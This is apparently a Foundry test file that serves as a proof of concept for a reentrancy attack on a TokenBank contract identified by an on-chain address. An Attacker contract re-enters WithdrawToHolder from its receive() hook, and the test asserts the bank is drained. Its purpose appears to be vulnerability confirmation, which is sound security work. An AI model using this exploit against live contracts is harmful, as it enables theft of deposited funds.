// SPDX-License-Identifier: MIT
pragma solidity 0.8.26;
pragma experimental ABIEncoderV2;

import {Test} from "forge-std/Test.sol";
import {console} from "forge-std/console.sol"; // Added console import
import "../src/0x8fd1e427396ddb511533cf9abdbebd0a7e08da35.sol";

contract TokenBankTest is Test {
    TokenBank public tokenBank;
    Attacker public attacker;
    uint256 constant DEPOSIT_AMOUNT = 1 ether;

    function setUp() public {
        tokenBank = new TokenBank();
        // Test contract deposits as owner to become a holder
        vm.deal(address(this), DEPOSIT_AMOUNT);
        tokenBank.Deposit{value: DEPOSIT_AMOUNT}();
    }

    // Public wrapper to call TokenBank's WithdrawToHolder
    function withdrawToHolder(address _addr, uint256 _amount) public {
        tokenBank.WithdrawToHolder{value: 0}(_addr, _amount);
    }

    function test_WithdrawToHolder_UnderflowViaReentrancy() public {
        // Deploy attacker with test contract reference
        attacker = new Attacker(address(this));
        // Fund attacker for deposit
        vm.deal(address(attacker), DEPOSIT_AMOUNT);
        
        // Attacker deposits into TokenBank
        vm.prank(address(attacker));
        tokenBank.Deposit{value: DEPOSIT_AMOUNT}();
        
        console.log("--- BEFORE-Trigger Balances ---");
        uint256 tokenBankBalanceBefore = address(tokenBank).balance;
        uint256 attackerBalanceBefore = address(attacker).balance;
        console.log("TokenBank balance: %d", tokenBankBalanceBefore);
        console.log("Attacker balance: %d", attackerBalanceBefore);
        
        console.log("--- Trigger Withdraw (with reentrancy) ---");
        bool success;
        try this.withdrawToHolder(address(attacker), DEPOSIT_AMOUNT) {
            success = true;
        } catch {
            success = false;
        }
        console.log("Transaction result: %s", success ? "Success" : "Failed");

        console.log("--- AFTER-Trigger Balances ---");
        uint256 tokenBankBalanceAfter = address(tokenBank).balance;
        uint256 attackerBalanceAfter = address(attacker).balance;
        console.log("TokenBank balance: %d", tokenBankBalanceAfter);
        console.log("Attacker balance: %d", attackerBalanceAfter);
        
        // Vulnerability check logic
        if (success && tokenBankBalanceAfter == 0 && attackerBalanceAfter == 2 * DEPOSIT_AMOUNT) {
            console.log("VULNERABILITY CONFIRMED: Bank drained via reentrancy");
            console.log("Vulnerability Exists: Attacker successfully drained bank via reentrancy underflow");
        } else {
            console.log("VULNERABILITY NOT TRIGGERED: Attack failed");
            console.log("Vulnerability not Exist: Reentrancy attack either reverted or failed to drain funds");
        }
        
        // Keep original assertions
        assertEq(address(attacker).balance, 2 * DEPOSIT_AMOUNT);
        assertEq(address(tokenBank).balance, 0);
    }
}

// Attacker contract for reentrancy
contract Attacker {
    address testContract;
    uint256 constant DEPOSIT_AMOUNT = 1 ether;
    uint256 reentryCount;

    constructor(address _testContract) {
        testContract = _testContract;
    }

    receive() external payable {
        reentryCount++;
        if (reentryCount < 2) {
            // Reenter to trigger another withdrawal
            (bool success,) = testContract.call(
                abi.encodeWithSignature(
                    "withdrawToHolder(address,uint256)", 
                    address(this), 
                    DEPOSIT_AMOUNT
                )
            );
            require(success, "Reentrancy call failed");
        }
    }
}